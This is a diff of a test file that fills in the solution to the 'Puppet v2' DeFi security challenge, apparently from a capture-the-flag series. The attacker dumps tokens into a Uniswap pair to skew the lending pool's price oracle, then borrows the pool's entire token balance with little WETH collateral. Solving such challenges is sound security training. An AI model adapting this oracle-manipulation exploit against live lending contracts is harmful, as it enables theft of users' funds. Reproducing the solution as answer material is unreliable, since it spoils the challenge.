@@ -81,7 +81,75 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        
+        let tx;
+
+        const weth = this.weth;
+        const token = this.token;
+        const lendingPool = this.lendingPool;
+        const uniswapExchange = this.uniswapExchange;
+
+
+        async function getDepositOfWethRequired() {
+            const depositRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+            const attackerWethReserves = await weth.balanceOf(attacker.address);
+            console.log({
+                depositRequired: ethers.utils.formatEther(depositRequired),
+                attackerWethReserves: ethers.utils.formatEther(attackerWethReserves),
+            });
+            return [depositRequired, attackerWethReserves];
+        }
+
+        async function logUniswapBalance() {
+            const [tokenReserves, wethReserves] = await uniswapExchange.getReserves();
+            console.log({
+                tokenReserves: ethers.utils.formatEther(tokenReserves),
+                wethReserves: ethers.utils.formatEther(wethReserves),
+            });
+        }
+
+        await getDepositOfWethRequired();
+
+        // sell all the tokens to uniswap
+        console.log('approve tokens transfer');
+        tx = await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        await tx.wait();
+
+        await logUniswapBalance();
+
+        tx = await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        );
+        await tx.wait();
+
+        await logUniswapBalance();
+        const [depositRequired, attackerWethReserves] = await getDepositOfWethRequired();
+
+        console.log('swap the necessary eth for weth');
+        tx = await this.weth.connect(attacker).deposit({ 
+            value: depositRequired.sub(attackerWethReserves),
+        });
+        await tx.wait();
+
+        await getDepositOfWethRequired();
+
+        console.log('approve weth deposit');
+        tx = await this.weth.connect(attacker).approve(
+            this.lendingPool.address,
+            depositRequired,
+        );
+        await tx.wait();
+
+        console.log('borrow all the tokens');
+        tx = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        await tx.wait();
     });
 
     after(async function () {
